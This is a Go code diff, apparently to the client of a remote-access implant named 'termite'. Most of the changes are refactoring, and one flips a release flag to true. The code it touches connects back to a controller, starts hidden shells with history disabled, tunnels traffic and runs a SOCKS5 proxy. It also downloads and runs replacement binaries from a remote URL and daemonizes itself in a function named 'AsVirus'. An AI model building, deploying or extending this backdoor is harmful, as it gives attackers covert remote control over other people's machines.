@@ -32,24 +32,24 @@ import (
 	"github.com/sevlyar/go-daemon"
 )
 
-type Backoff struct {
+type backOff struct {
 	Current int64
 	Unit    time.Duration
 	Max     int64
 }
 
-func (b *Backoff) Reset() {
+func (b *backOff) Reset() {
 	b.Current = 1
 }
 
-func (b *Backoff) increase() {
+func (b *backOff) increase() {
 	b.Current <<= 1
 	if b.Current > b.Max {
 		b.Reset()
 	}
 }
 
-func (b *Backoff) Sleep(add int64) {
+func (b *backOff) Sleep(add int64) {
 	var i int64 = 0
 	for i < b.Current+add {
 		time.Sleep(b.Unit)
@@ -58,8 +58,8 @@ func (b *Backoff) Sleep(add int64) {
 	b.increase()
 }
 
-func CreateBackOff() *Backoff {
-	backoff := &Backoff{
+func createBackOff() *backOff {
+	backoff := &backOff{
 		Unit: time.Second,
 		Max:  0x100,
 	}
@@ -67,20 +67,20 @@ func CreateBackOff() *Backoff {
 	return backoff
 }
 
-var backoff *Backoff
+var backoff *backOff
 
-type TermiteProcess struct {
+type termiteProcess struct {
 	ptmx       *os.File
 	windowSize *pty.Winsize
 	process    *exec.Cmd
 }
 
-var processes map[string]*TermiteProcess
+var processes map[string]*termiteProcess
 var pullTunnels map[string]*net.Conn
 var pushTunnels map[string]*net.Conn
 var socks5ServerListener *net.Listener
 
-type Client struct {
+type client struct {
 	Conn        *tls.Conn
 	Encoder     *gob.Encoder
 	Decoder     *gob.Decoder
@@ -89,8 +89,8 @@ type Client struct {
 	Service     string
 }
 
-func handleConnection(c *Client) {
-	oldBackoffCurrent := backoff.Current
+func handleConnection(c *client) {
+	oldbackOffCurrent := backoff.Current
 
 	for {
 		msg := &message.Message{}
@@ -139,13 +139,13 @@ func handleConnection(c *Client) {
 			process.Env = append(process.Env, "HISTFILESIZE=0")
 
 			windowSize := pty.Winsize{
-				uint16(bodyStartProcess.WindowRows),
-				uint16(bodyStartProcess.WindowColumns),
-				0,
-				0,
+				Rows: uint16(bodyStartProcess.WindowRows),
+				Cols: uint16(bodyStartProcess.WindowColumns),
+				X:    0,
+				Y:    0,
 			}
 			ptmx, _ := pty.StartWithSize(process, &windowSize)
-			processes[bodyStartProcess.Key] = &TermiteProcess{
+			processes[bodyStartProcess.Key] = &termiteProcess{
 				windowSize: &windowSize,
 				ptmx:       ptmx,
 				process:    process,
@@ -186,7 +186,7 @@ func handleConnection(c *Client) {
 							c.EncoderLock.Unlock()
 							if err != nil {
 								// Network
-								fmt.Println("Process stoped: %v", err)
+								log.Error("Process stop: %s", err.Error())
 								break
 							}
 							break
@@ -288,7 +288,7 @@ func handleConnection(c *Client) {
 				return
 			}
 		case message.DUPLICATED_CLIENT:
-			backoff.Current = oldBackoffCurrent
+			backoff.Current = oldbackOffCurrent
 			log.Error("Duplicated connection")
 			os.Exit(0)
 		case message.PROCESS_TERMINATE:
@@ -344,18 +344,17 @@ func handleConnection(c *Client) {
 								c.EncoderLock.Unlock()
 								conn.Close()
 								break
-							} else {
-								if n > 0 {
-									c.EncoderLock.Lock()
-									c.Encoder.Encode(message.Message{
-										Type: message.PULL_TUNNEL_DATA,
-										Body: message.BodyPullTunnelData{
-											Token: token,
-											Data:  buffer[0:n],
-										},
-									})
-									c.EncoderLock.Unlock()
-								}
+							}
+							if n > 0 {
+								c.EncoderLock.Lock()
+								c.Encoder.Encode(message.Message{
+									Type: message.PULL_TUNNEL_DATA,
+									Body: message.BodyPullTunnelData{
+										Token: token,
+										Data:  buffer[0:n],
+									},
+								})
+								c.EncoderLock.Unlock()
 							}
 						}
 					}()
@@ -672,10 +671,10 @@ func handleConnection(c *Client) {
 			file, _ := ioutil.TempFile(os.TempDir(), "temp")
 			exe := file.Name()
 			log.Info("New filename: %s", exe)
-			distributorUrl := msg.Body.(*message.BodyUpdate).DistributorUrl
+			DistributorURL := msg.Body.(*message.BodyUpdate).DistributorURL
 			version := msg.Body.(*message.BodyUpdate).Version
 			log.Info("New version v%s is available, upgrading...", version)
-			url := fmt.Sprintf("%s/termite/%s", distributorUrl, c.Service)
+			url := fmt.Sprintf("%s/termite/%s", DistributorURL, c.Service)
 			if err := selfupdate.UpdateTo(url, exe); err != nil {
 				log.Error("Error occurred while updating binary: %s", err)
 				return
@@ -745,11 +744,11 @@ func StartClient(service string) bool {
 			x509.MarshalPKIXPublicKey(v.PublicKey)
 		}
 
-		log.Debug("client: handshake: %s", state.HandshakeComplete)
-		log.Debug("client: mutual: %s", state.NegotiatedProtocolIsMutual)
+		log.Debug("client: handshake: %v", state.HandshakeComplete)
+		log.Debug("client: mutual: %v", state.NegotiatedProtocolIsMutual)
 		log.Success("Secure connection established on %s", conn.RemoteAddr())
 
-		c := &Client{
+		c := &client{
 			Conn:        conn,
 			Encoder:     gob.NewEncoder(conn),
 			Decoder:     gob.NewDecoder(conn),
@@ -777,7 +776,7 @@ func AsVirus() {
 	}
 	d, err := cntxt.Reborn()
 	if err != nil {
-		log.Error("Unable to run: ", err)
+		log.Error("Unable to run: %s", err.Error())
 	}
 	if d != nil {
 		os.Exit(0)
@@ -789,7 +788,7 @@ func AsVirus() {
 }
 
 func main() {
-	release := false
+	release := true
 	service := "127.0.0.1:13337"
 
 	if release {
@@ -798,8 +797,8 @@ func main() {
 	}
 
 	message.RegisterGob()
-	backoff = CreateBackOff()
-	processes = map[string]*TermiteProcess{}
+	backoff = createBackOff()
+	processes = map[string]*termiteProcess{}
 	pullTunnels = map[string]*net.Conn{}
 	pushTunnels = map[string]*net.Conn{}
 
